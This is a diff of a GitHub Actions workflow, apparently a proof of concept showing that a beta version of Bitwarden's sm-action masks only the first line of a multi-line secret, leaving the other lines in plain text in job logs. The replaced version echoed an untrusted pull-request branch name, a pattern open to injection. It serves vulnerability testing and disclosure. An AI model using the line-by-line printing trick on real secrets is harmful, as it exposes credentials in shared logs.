@@ -1,18 +1,60 @@
-# Publish GitHub workflow artifacts tutorial example
-name: Github toJSON Test
+name: PoC - Multi-line Secret Masking Bypass
+
 on:
-  workflow_run:
-    workflows: ["PR Trigger"]
-    types: [completed]
+  workflow_dispatch:
+    inputs:
+      secret_id:
+        description: "Bitwarden SM secret UUID containing the multi-line test value"
+        required: true
+        type: string
 
 permissions: {}
 
 jobs:
-  github-actions-environment-variables-ubuntu:
+  v2-typescript:
+    name: "v2.2.0 (TypeScript - expected: all lines masked)"
     runs-on: ubuntu-latest
+
     steps:
-      - name: Check toJSON strings
+      - name: Fetch multi-line secret via sm-action v2.2.0
+        id: sm
+        uses: bitwarden/sm-action@v2.2.0
+        with:
+          access_token: ${{ secrets.BW_ACCESS_TOKEN }}
+          secrets: |
+            ${{ inputs.secret_id }} > TEST_MULTILINE_SECRET
+
+      - name: Print secret value line by line
         env:
-          TEST: ${{ github.event.workflow_run.pull_requests[0].head.ref }}
-          TEST_JSON: ${{ toJSON(github.event.workflow_run.pull_requests[0].head.ref) }}
-        run: echo "$TEST\n$TEST_JSON"
+          SECRET_VAL: ${{ env.TEST_MULTILINE_SECRET }}
+        run: |
+          echo "=== v2.2.0 masking result ==="
+          echo "All lines should appear as *** if masking is working correctly."
+          echo ""
+          echo "$SECRET_VAL" | while IFS= read -r line; do
+            echo "LINE: $line"
+          done
+
+  v3-rust:
+    name: "v3.0.0-beta.4 (Rust - expected: only first line masked)"
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Fetch multi-line secret via sm-action v3.0.0-beta.4
+        id: sm
+        uses: bitwarden/sm-action@v3.0.0-beta.4
+        with:
+          access_token: ${{ secrets.BW_ACCESS_TOKEN }}
+          secrets: |
+            ${{ inputs.secret_id }} > TEST_MULTILINE_SECRET
+
+      - name: Print secret value line by line
+        env:
+          SECRET_VAL: ${{ env.TEST_MULTILINE_SECRET }}
+        run: |
+          echo "=== v3.0.0-beta.4 masking result ==="
+          echo "If vulnerable: only the first line is ***, subsequent lines are plaintext."
+          echo ""
+          echo "$SECRET_VAL" | while IFS= read -r line; do
+            echo "LINE: $line"
+          done
